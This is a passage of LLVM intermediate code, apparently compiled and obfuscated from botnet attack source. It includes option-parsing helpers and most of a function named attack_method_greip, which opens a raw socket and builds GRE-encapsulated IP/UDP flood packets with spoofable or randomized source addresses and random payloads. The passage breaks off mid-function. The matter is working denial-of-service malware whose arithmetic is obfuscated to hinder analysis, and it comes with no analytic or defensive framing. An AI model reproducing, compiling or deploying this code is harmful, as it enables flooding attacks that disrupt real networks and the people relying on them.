  %10 = alloca i32, align 4
  store i8 %0, i8* %6, align 1
  store %struct.attack_option* %1, %struct.attack_option** %7, align 8
  store i8 %2, i8* %8, align 1
  store i8* %3, i8** %9, align 8
  store i32 0, i32* %10, align 4
  br label %11

; <label>:11:                                     ; preds = %35, %4
  %12 = load i32, i32* %10, align 4
  %13 = load i8, i8* %6, align 1
  %14 = zext i8 %13 to i32
  %15 = icmp slt i32 %12, %14
  br i1 %15, label %16, label %40

; <label>:16:                                     ; preds = %11
  %17 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %18 = load i32, i32* %10, align 4
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %17, i64 %19
  %21 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %20, i32 0, i32 1
  %22 = load i8, i8* %21, align 8
  %23 = zext i8 %22 to i32
  %24 = load i8, i8* %8, align 1
  %25 = zext i8 %24 to i32
  %26 = icmp eq i32 %23, %25
  br i1 %26, label %27, label %34

; <label>:27:                                     ; preds = %16
  %28 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %29 = load i32, i32* %10, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %28, i64 %30
  %32 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %31, i32 0, i32 0
  %33 = load i8*, i8** %32, align 8
  store i8* %33, i8** %5, align 8
  br label %42

; <label>:34:                                     ; preds = %16
  br label %35

; <label>:35:                                     ; preds = %34
  %36 = load i32, i32* %10, align 4
  %37 = sub i32 0, 1
  %38 = sub i32 %36, %37
  %39 = add nsw i32 %36, 1
  store i32 %38, i32* %10, align 4
  br label %11

; <label>:40:                                     ; preds = %11
  %41 = load i8*, i8** %9, align 8
  store i8* %41, i8** %5, align 8
  br label %42

; <label>:42:                                     ; preds = %40, %27
  %43 = load i8*, i8** %5, align 8
  ret i8* %43
}

; Function Attrs: noinline nounwind uwtable
define i32 @attack_get_opt_int(i8 zeroext, %struct.attack_option*, i8 zeroext, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i8, align 1
  %7 = alloca %struct.attack_option*, align 8
  %8 = alloca i8, align 1
  %9 = alloca i32, align 4
  %10 = alloca i8*, align 8
  store i8 %0, i8* %6, align 1
  store %struct.attack_option* %1, %struct.attack_option** %7, align 8
  store i8 %2, i8* %8, align 1
  store i32 %3, i32* %9, align 4
  %11 = load i8, i8* %6, align 1
  %12 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %13 = load i8, i8* %8, align 1
  %14 = call i8* @attack_get_opt_str(i8 zeroext %11, %struct.attack_option* %12, i8 zeroext %13, i8* null)
  store i8* %14, i8** %10, align 8
  %15 = load i8*, i8** %10, align 8
  %16 = icmp eq i8* %15, null
  br i1 %16, label %17, label %19

; <label>:17:                                     ; preds = %4
  %18 = load i32, i32* %9, align 4
  store i32 %18, i32* %5, align 4
  br label %22

; <label>:19:                                     ; preds = %4
  %20 = load i8*, i8** %10, align 8
  %21 = call i32 @util_atoi(i8* %20, i32 10)
  store i32 %21, i32* %5, align 4
  br label %22

; <label>:22:                                     ; preds = %19, %17
  %23 = load i32, i32* %5, align 4
  ret i32 %23
}

declare i32 @util_atoi(i8*, i32) #3

; Function Attrs: noinline nounwind uwtable
define i32 @attack_get_opt_ip(i8 zeroext, %struct.attack_option*, i8 zeroext, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i8, align 1
  %7 = alloca %struct.attack_option*, align 8
  %8 = alloca i8, align 1
  %9 = alloca i32, align 4
  %10 = alloca i8*, align 8
  store i8 %0, i8* %6, align 1
  store %struct.attack_option* %1, %struct.attack_option** %7, align 8
  store i8 %2, i8* %8, align 1
  store i32 %3, i32* %9, align 4
  %11 = load i8, i8* %6, align 1
  %12 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %13 = load i8, i8* %8, align 1
  %14 = call i8* @attack_get_opt_str(i8 zeroext %11, %struct.attack_option* %12, i8 zeroext %13, i8* null)
  store i8* %14, i8** %10, align 8
  %15 = load i8*, i8** %10, align 8
  %16 = icmp eq i8* %15, null
  br i1 %16, label %17, label %19

; <label>:17:                                     ; preds = %4
  %18 = load i32, i32* %9, align 4
  store i32 %18, i32* %5, align 4
  br label %22

; <label>:19:                                     ; preds = %4
  %20 = load i8*, i8** %10, align 8
  %21 = call i32 @inet_addr(i8* %20) #6
  store i32 %21, i32* %5, align 4
  br label %22

; <label>:22:                                     ; preds = %19, %17
  %23 = load i32, i32* %5, align 4
  ret i32 %23
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) #1

; Function Attrs: noinline nounwind uwtable
define void @attack_method_greip(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i32, align 4
  %19 = alloca i8, align 1
  %20 = alloca i8, align 1
  %21 = alloca i32, align 4
  %22 = alloca %struct.iphdr*, align 8
  %23 = alloca %struct.grehdr*, align 8
  %24 = alloca %struct.iphdr*, align 8
  %25 = alloca %struct.udphdr*, align 8
  %26 = alloca i8*, align 8
  %27 = alloca %struct.iphdr*, align 8
  %28 = alloca %struct.grehdr*, align 8
  %29 = alloca %struct.iphdr*, align 8
  %30 = alloca %struct.udphdr*, align 8
  %31 = alloca i8*, align 8
  %32 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %33 = load i8, i8* %5, align 1
  %34 = zext i8 %33 to i64
  %35 = call noalias i8* @calloc(i64 %34, i64 8) #6
  %36 = bitcast i8* %35 to i8**
  store i8** %36, i8*** %11, align 8
  %37 = load i8, i8* %7, align 1
  %38 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %39 = call i32 @attack_get_opt_int(i8 zeroext %37, %struct.attack_option* %38, i8 zeroext 2, i32 0)
  %40 = trunc i32 %39 to i8
  store i8 %40, i8* %12, align 1
  %41 = load i8, i8* %7, align 1
  %42 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %43 = call i32 @attack_get_opt_int(i8 zeroext %41, %struct.attack_option* %42, i8 zeroext 3, i32 65535)
  %44 = trunc i32 %43 to i16
  store i16 %44, i16* %13, align 2
  %45 = load i8, i8* %7, align 1
  %46 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %47 = call i32 @attack_get_opt_int(i8 zeroext %45, %struct.attack_option* %46, i8 zeroext 4, i32 64)
  %48 = trunc i32 %47 to i8
  store i8 %48, i8* %14, align 1
  %49 = load i8, i8* %7, align 1
  %50 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %51 = call i32 @attack_get_opt_int(i8 zeroext %49, %struct.attack_option* %50, i8 zeroext 5, i32 1)
  %52 = trunc i32 %51 to i8
  store i8 %52, i8* %15, align 1
  %53 = load i8, i8* %7, align 1
  %54 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %55 = call i32 @attack_get_opt_int(i8 zeroext %53, %struct.attack_option* %54, i8 zeroext 6, i32 65535)
  %56 = trunc i32 %55 to i16
  store i16 %56, i16* %16, align 2
  %57 = load i8, i8* %7, align 1
  %58 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %59 = call i32 @attack_get_opt_int(i8 zeroext %57, %struct.attack_option* %58, i8 zeroext 7, i32 65535)
  %60 = trunc i32 %59 to i16
  store i16 %60, i16* %17, align 2
  %61 = load i8, i8* %7, align 1
  %62 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %63 = call i32 @attack_get_opt_int(i8 zeroext %61, %struct.attack_option* %62, i8 zeroext 0, i32 512)
  store i32 %63, i32* %18, align 4
  %64 = load i8, i8* %7, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %66 = call i32 @attack_get_opt_int(i8 zeroext %64, %struct.attack_option* %65, i8 zeroext 1, i32 1)
  %67 = trunc i32 %66 to i8
  store i8 %67, i8* %19, align 1
  %68 = load i8, i8* %7, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %70 = call i32 @attack_get_opt_int(i8 zeroext %68, %struct.attack_option* %69, i8 zeroext 19, i32 0)
  %71 = trunc i32 %70 to i8
  store i8 %71, i8* %20, align 1
  %72 = load i8, i8* %7, align 1
  %73 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %74 = load i32, i32* @LOCAL_ADDR, align 4
  %75 = call i32 @attack_get_opt_int(i8 zeroext %72, %struct.attack_option* %73, i8 zeroext 25, i32 %74)
  store i32 %75, i32* %21, align 4
  %76 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %76, i32* %10, align 4
  %77 = icmp eq i32 %76, -1
  br i1 %77, label %78, label %79

; <label>:78:                                     ; preds = %4
  br label %530

; <label>:79:                                     ; preds = %4
  store i32 1, i32* %9, align 4
  %80 = load i32, i32* %10, align 4
  %81 = bitcast i32* %9 to i8*
  %82 = call i32 @setsockopt(i32 %80, i32 0, i32 3, i8* %81, i32 4) #6
  %83 = icmp eq i32 %82, -1
  br i1 %83, label %84, label %87

; <label>:84:                                     ; preds = %79
  %85 = load i32, i32* %10, align 4
  %86 = call i32 @close(i32 %85)
  br label %530

; <label>:87:                                     ; preds = %79
  store i32 0, i32* %9, align 4
  br label %88

; <label>:88:                                     ; preds = %296, %87
  %89 = load i32, i32* %9, align 4
  %90 = load i8, i8* %5, align 1
  %91 = zext i8 %90 to i32
  %92 = icmp slt i32 %89, %91
  br i1 %92, label %93, label %302

; <label>:93:                                     ; preds = %88
  %94 = call noalias i8* @calloc(i64 1510, i64 8) #6
  %95 = load i8**, i8*** %11, align 8
  %96 = load i32, i32* %9, align 4
  %97 = sext i32 %96 to i64
  %98 = getelementptr inbounds i8*, i8** %95, i64 %97
  store i8* %94, i8** %98, align 8
  %99 = load i8**, i8*** %11, align 8
  %100 = load i32, i32* %9, align 4
  %101 = sext i32 %100 to i64
  %102 = getelementptr inbounds i8*, i8** %99, i64 %101
  %103 = load i8*, i8** %102, align 8
  %104 = bitcast i8* %103 to %struct.iphdr*
  store %struct.iphdr* %104, %struct.iphdr** %22, align 8
  %105 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %106 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %105, i64 1
  %107 = bitcast %struct.iphdr* %106 to %struct.grehdr*
  store %struct.grehdr* %107, %struct.grehdr** %23, align 8
  %108 = load %struct.grehdr*, %struct.grehdr** %23, align 8
  %109 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %108, i64 1
  %110 = bitcast %struct.grehdr* %109 to %struct.iphdr*
  store %struct.iphdr* %110, %struct.iphdr** %24, align 8
  %111 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %112 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %111, i64 1
  %113 = bitcast %struct.iphdr* %112 to %struct.udphdr*
  store %struct.udphdr* %113, %struct.udphdr** %25, align 8
  %114 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %115 = bitcast %struct.iphdr* %114 to i8*
  %116 = load i8, i8* %115, align 4
  %117 = xor i8 %116, -1
  %118 = xor i8 15, -1
  %119 = xor i8 51, -1
  %120 = or i8 %117, %118
  %121 = or i8 51, %119
  %122 = xor i8 %120, -1
  %123 = and i8 %122, %121
  %124 = and i8 %116, 15
  %125 = and i8 %123, 64
  %126 = xor i8 %123, 64
  %127 = or i8 %125, %126
  %128 = or i8 %123, 64
  store i8 %127, i8* %115, align 4
  %129 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %130 = bitcast %struct.iphdr* %129 to i8*
  %131 = load i8, i8* %130, align 4
  %132 = xor i8 -16, -1
  %133 = xor i8 %131, %132
  %134 = and i8 %133, %131
  %135 = and i8 %131, -16
  %136 = and i8 %134, 5
  %137 = xor i8 %134, 5
  %138 = or i8 %136, %137
  %139 = or i8 %134, 5
  store i8 %138, i8* %130, align 4
  %140 = load i8, i8* %12, align 1
  %141 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %142 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %141, i32 0, i32 1
  store i8 %140, i8* %142, align 1
  %143 = load i32, i32* %18, align 4
  %144 = sext i32 %143 to i64
  %145 = sub i64 52, -1544674265590339255
  %146 = add i64 %145, %144
  %147 = add i64 %146, -1544674265590339255
  %148 = add i64 52, %144
  %149 = trunc i64 %147 to i16
  %150 = call zeroext i16 @htons(i16 zeroext %149) #7
  %151 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %152 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %151, i32 0, i32 2
  store i16 %150, i16* %152, align 2
  %153 = load i16, i16* %13, align 2
  %154 = call zeroext i16 @htons(i16 zeroext %153) #7
  %155 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %156 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %155, i32 0, i32 3
  store i16 %154, i16* %156, align 4
  %157 = load i8, i8* %14, align 1
  %158 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %159 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %158, i32 0, i32 5
  store i8 %157, i8* %159, align 4
  %160 = load i8, i8* %15, align 1
  %161 = icmp ne i8 %160, 0
  br i1 %161, label %162, label %166

; <label>:162:                                    ; preds = %93
  %163 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %164 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %165 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %164, i32 0, i32 4
  store i16 %163, i16* %165, align 2
  br label %166

; <label>:166:                                    ; preds = %162, %93
  %167 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %168 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %167, i32 0, i32 6
  store i8 47, i8* %168, align 1
  %169 = load i32, i32* %21, align 4
  %170 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %171 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %170, i32 0, i32 8
  store i32 %169, i32* %171, align 4
  %172 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %173 = load i32, i32* %9, align 4
  %174 = sext i32 %173 to i64
  %175 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %172, i64 %174
  %176 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %175, i32 0, i32 1
  %177 = load i32, i32* %176, align 4
  %178 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %179 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %178, i32 0, i32 9
  store i32 %177, i32* %179, align 4
  %180 = call zeroext i16 @htons(i16 zeroext 2048) #7
  %181 = load %struct.grehdr*, %struct.grehdr** %23, align 8
  %182 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %181, i32 0, i32 1
  store i16 %180, i16* %182, align 2
  %183 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %184 = bitcast %struct.iphdr* %183 to i8*
  %185 = load i8, i8* %184, align 4
  %186 = xor i8 15, -1
  %187 = xor i8 %185, %186
  %188 = and i8 %187, %185
  %189 = and i8 %185, 15
  %190 = and i8 %188, 64
  %191 = xor i8 %188, 64
  %192 = or i8 %190, %191
  %193 = or i8 %188, 64
  store i8 %192, i8* %184, align 4
  %194 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %195 = bitcast %struct.iphdr* %194 to i8*
  %196 = load i8, i8* %195, align 4
  %197 = xor i8 %196, -1
  %198 = xor i8 -16, -1
  %199 = xor i8 -29, -1
  %200 = or i8 %197, %198
  %201 = or i8 -29, %199
  %202 = xor i8 %200, -1
  %203 = and i8 %202, %201
  %204 = and i8 %196, -16
  %205 = and i8 %203, 5
  %206 = xor i8 %203, 5
  %207 = or i8 %205, %206
  %208 = or i8 %203, 5
  store i8 %207, i8* %195, align 4
  %209 = load i8, i8* %12, align 1
  %210 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %211 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %210, i32 0, i32 1
  store i8 %209, i8* %211, align 1
  %212 = load i32, i32* %18, align 4
  %213 = sext i32 %212 to i64
  %214 = sub i64 28, 6762130886230679145
  %215 = add i64 %214, %213
  %216 = add i64 %215, 6762130886230679145
  %217 = add i64 28, %213
  %218 = trunc i64 %216 to i16
  %219 = call zeroext i16 @htons(i16 zeroext %218) #7
  %220 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %221 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %220, i32 0, i32 2
  store i16 %219, i16* %221, align 2
  %222 = load i16, i16* %13, align 2
  %223 = zext i16 %222 to i32
  %224 = xor i32 %223, -1
  %225 = and i32 -1, %224
  %226 = xor i32 -1, -1
  %227 = and i32 %223, %226
  %228 = or i32 %225, %227
  %229 = xor i32 %223, -1
  %230 = trunc i32 %228 to i16
  %231 = call zeroext i16 @htons(i16 zeroext %230) #7
  %232 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %233 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %232, i32 0, i32 3
  store i16 %231, i16* %233, align 4
  %234 = load i8, i8* %14, align 1
  %235 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %236 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %235, i32 0, i32 5
  store i8 %234, i8* %236, align 4
  %237 = load i8, i8* %15, align 1
  %238 = icmp ne i8 %237, 0
  br i1 %238, label %239, label %243

; <label>:239:                                    ; preds = %166
  %240 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %241 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %242 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %241, i32 0, i32 4
  store i16 %240, i16* %242, align 2
  br label %243

; <label>:243:                                    ; preds = %239, %166
  %244 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %245 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %244, i32 0, i32 6
  store i8 17, i8* %245, align 1
  %246 = call i32 @rand_next()
  %247 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %248 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %247, i32 0, i32 8
  store i32 %246, i32* %248, align 4
  %249 = load i8, i8* %20, align 1
  %250 = icmp ne i8 %249, 0
  br i1 %250, label %251, label %257

; <label>:251:                                    ; preds = %243
  %252 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %253 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %252, i32 0, i32 9
  %254 = load i32, i32* %253, align 4
  %255 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %256 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %255, i32 0, i32 9
  store i32 %254, i32* %256, align 4
  br label %278

; <label>:257:                                    ; preds = %243
  %258 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %259 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %258, i32 0, i32 8
  %260 = load i32, i32* %259, align 4
  %261 = add i32 %260, -138990906
  %262 = sub i32 %261, 1024
  %263 = sub i32 %262, -138990906
  %264 = sub i32 %260, 1024
  %265 = xor i32 %263, -1
  %266 = and i32 -165116521, %265
  %267 = xor i32 -165116521, -1
  %268 = and i32 %263, %267
  %269 = xor i32 -1, -1
  %270 = and i32 %269, -165116521
  %271 = and i32 -1, %267
  %272 = or i32 %266, %268
  %273 = or i32 %270, %271
  %274 = xor i32 %272, %273
  %275 = xor i32 %263, -1
  %276 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %277 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %276, i32 0, i32 9
  store i32 %274, i32* %277, align 4
  br label %278

; <label>:278:                                    ; preds = %257, %251
  %279 = load i16, i16* %16, align 2
  %280 = call zeroext i16 @htons(i16 zeroext %279) #7
  %281 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %282 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %281, i32 0, i32 0
  store i16 %280, i16* %282, align 2
  %283 = load i16, i16* %17, align 2
  %284 = call zeroext i16 @htons(i16 zeroext %283) #7
  %285 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %286 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %285, i32 0, i32 1
  store i16 %284, i16* %286, align 2
  %287 = load i32, i32* %18, align 4
  %288 = sext i32 %287 to i64
  %289 = sub i64 0, %288
  %290 = sub i64 8, %289
  %291 = add i64 8, %288
  %292 = trunc i64 %290 to i16
  %293 = call zeroext i16 @htons(i16 zeroext %292) #7
  %294 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %295 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %294, i32 0, i32 2
  store i16 %293, i16* %295, align 2
  br label %296

; <label>:296:                                    ; preds = %278
  %297 = load i32, i32* %9, align 4
  %298 = sub i32 %297, -907351240
  %299 = add i32 %298, 1
  %300 = add i32 %299, -907351240
  %301 = add nsw i32 %297, 1
  store i32 %300, i32* %9, align 4
  br label %88

; <label>:302:                                    ; preds = %88
  br label %303

; <label>:303:                                    ; preds = %529, %302
  store i32 0, i32* %9, align 4
  br label %304

; <label>:304:                                    ; preds = %523, %303
  %305 = load i32, i32* %9, align 4
  %306 = load i8, i8* %5, align 1
  %307 = zext i8 %306 to i32
  %308 = icmp slt i32 %305, %307
  br i1 %308, label %309, label %529

; <label>:309:                                    ; preds = %304
  %310 = load i8**, i8*** %11, align 8
  %311 = load i32, i32* %9, align 4
  %312 = sext i32 %311 to i64
  %313 = getelementptr inbounds i8*, i8** %310, i64 %312
  %314 = load i8*, i8** %313, align 8
  store i8* %314, i8** %26, align 8
  %315 = load i8*, i8** %26, align 8
  %316 = bitcast i8* %315 to %struct.iphdr*
  store %struct.iphdr* %316, %struct.iphdr** %27, align 8
  %317 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %318 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %317, i64 1
  %319 = bitcast %struct.iphdr* %318 to %struct.grehdr*
  store %struct.grehdr* %319, %struct.grehdr** %28, align 8
  %320 = load %struct.grehdr*, %struct.grehdr** %28, align 8
  %321 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %320, i64 1
  %322 = bitcast %struct.grehdr* %321 to %struct.iphdr*
  store %struct.iphdr* %322, %struct.iphdr** %29, align 8
  %323 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %324 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %323, i64 1
  %325 = bitcast %struct.iphdr* %324 to %struct.udphdr*
  store %struct.udphdr* %325, %struct.udphdr** %30, align 8
  %326 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %327 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %326, i64 1
  %328 = bitcast %struct.udphdr* %327 to i8*
  store i8* %328, i8** %31, align 8
  %329 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %330 = load i32, i32* %9, align 4
  %331 = sext i32 %330 to i64
  %332 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %329, i64 %331
  %333 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %332, i32 0, i32 2
  %334 = load i8, i8* %333, align 4
  %335 = zext i8 %334 to i32
  %336 = icmp slt i32 %335, 32
  br i1 %336, label %337, label %360

; <label>:337:                                    ; preds = %309
  %338 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %339 = load i32, i32* %9, align 4
  %340 = sext i32 %339 to i64
  %341 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %338, i64 %340
  %342 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %341, i32 0, i32 1
  %343 = load i32, i32* %342, align 4
  %344 = call i32 @ntohl(i32 %343) #7
  %345 = call i32 @rand_next()
  %346 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %347 = load i32, i32* %9, align 4
  %348 = sext i32 %347 to i64
  %349 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %346, i64 %348
  %350 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %349, i32 0, i32 2
  %351 = load i8, i8* %350, align 4
  %352 = zext i8 %351 to i32
  %353 = lshr i32 %345, %352
  %354 = sub i32 0, %353
  %355 = sub i32 %344, %354
  %356 = add i32 %344, %353
  %357 = call i32 @htonl(i32 %355) #7
  %358 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %359 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %358, i32 0, i32 9
  store i32 %357, i32* %359, align 4
  br label %360

; <label>:360:                                    ; preds = %337, %309
  %361 = load i32, i32* %21, align 4
  %362 = icmp eq i32 %361, -1
  br i1 %362, label %363, label %367

; <label>:363:                                    ; preds = %360
  %364 = call i32 @rand_next()
  %365 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %366 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %365, i32 0, i32 8
  store i32 %364, i32* %366, align 4
  br label %367

; <label>:367:                                    ; preds = %363, %360
  %368 = load i16, i16* %13, align 2
  %369 = zext i16 %368 to i32
  %370 = icmp eq i32 %369, 65535
  br i1 %370, label %371, label %402

; <label>:371:                                    ; preds = %367
  %372 = call i32 @rand_next()
  %373 = xor i32 65535, -1
  %374 = xor i32 %372, %373
  %375 = and i32 %374, %372
  %376 = and i32 %372, 65535
  %377 = trunc i32 %375 to i16
  %378 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %379 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %378, i32 0, i32 3
  store i16 %377, i16* %379, align 4
  %380 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %381 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %380, i32 0, i32 3
  %382 = load i16, i16* %381, align 4
  %383 = zext i16 %382 to i32
  %384 = add i32 %383, 544581103
  %385 = sub i32 %384, 1000
  %386 = sub i32 %385, 544581103
  %387 = sub nsw i32 %383, 1000
  %388 = xor i32 %386, -1
  %389 = and i32 685765890, %388
  %390 = xor i32 685765890, -1
  %391 = and i32 %386, %390
  %392 = xor i32 -1, -1
  %393 = and i32 %392, 685765890
  %394 = and i32 -1, %390
  %395 = or i32 %389, %391
  %396 = or i32 %393, %394
  %397 = xor i32 %395, %396
  %398 = xor i32 %386, -1
  %399 = trunc i32 %397 to i16
  %400 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %401 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %400, i32 0, i32 3
  store i16 %399, i16* %401, align 4
  br label %402

; <label>:402:                                    ; preds = %371, %367
  %403 = load i16, i16* %16, align 2
  %404 = zext i16 %403 to i32
  %405 = icmp eq i32 %404, 65535
  br i1 %405, label %406, label %415

; <label>:406:                                    ; preds = %402
  %407 = call i32 @rand_next()
  %408 = xor i32 65535, -1
  %409 = xor i32 %407, %408
  %410 = and i32 %409, %407
  %411 = and i32 %407, 65535
  %412 = trunc i32 %410 to i16
  %413 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %414 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %413, i32 0, i32 0
  store i16 %412, i16* %414, align 2
  br label %415

; <label>:415:                                    ; preds = %406, %402
  %416 = load i16, i16* %17, align 2
  %417 = zext i16 %416 to i32
  %418 = icmp eq i32 %417, 65535
  br i1 %418, label %419, label %432

; <label>:419:                                    ; preds = %415
  %420 = call i32 @rand_next()
  %421 = xor i32 %420, -1
  %422 = xor i32 65535, -1
  %423 = xor i32 -944664952, -1
  %424 = or i32 %421, %422
  %425 = or i32 -944664952, %423
  %426 = xor i32 %424, -1
  %427 = and i32 %426, %425
  %428 = and i32 %420, 65535
  %429 = trunc i32 %427 to i16
  %430 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %431 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %430, i32 0, i32 1
  store i16 %429, i16* %431, align 2
  br label %432

; <label>:432:                                    ; preds = %419, %415
  %433 = load i8, i8* %20, align 1
  %434 = icmp ne i8 %433, 0
  br i1 %434, label %439, label %435

; <label>:435:                                    ; preds = %432
  %436 = call i32 @rand_next()
  %437 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %438 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %437, i32 0, i32 9
  store i32 %436, i32* %438, align 4
  br label %445

; <label>:439:                                    ; preds = %432
  %440 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %441 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %440, i32 0, i32 9
  %442 = load i32, i32* %441, align 4
  %443 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %444 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %443, i32 0, i32 9
  store i32 %442, i32* %444, align 4
  br label %445

; <label>:445:                                    ; preds = %439, %435
  %446 = load i8, i8* %19, align 1
  %447 = icmp ne i8 %446, 0
  br i1 %447, label %448, label %451

; <label>:448:                                    ; preds = %445
  %449 = load i8*, i8** %31, align 8
  %450 = load i32, i32* %18, align 4
  call void @rand_str(i8* %449, i32 %450)
  br label %451

; <label>:451:                                    ; preds = %448, %445
  %452 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %453 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %452, i32 0, i32 7
  store i16 0, i16* %453, align 2
  %454 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %455 = bitcast %struct.iphdr* %454 to i16*
  %456 = call zeroext i16 @checksum_generic(i16* %455, i32 20)
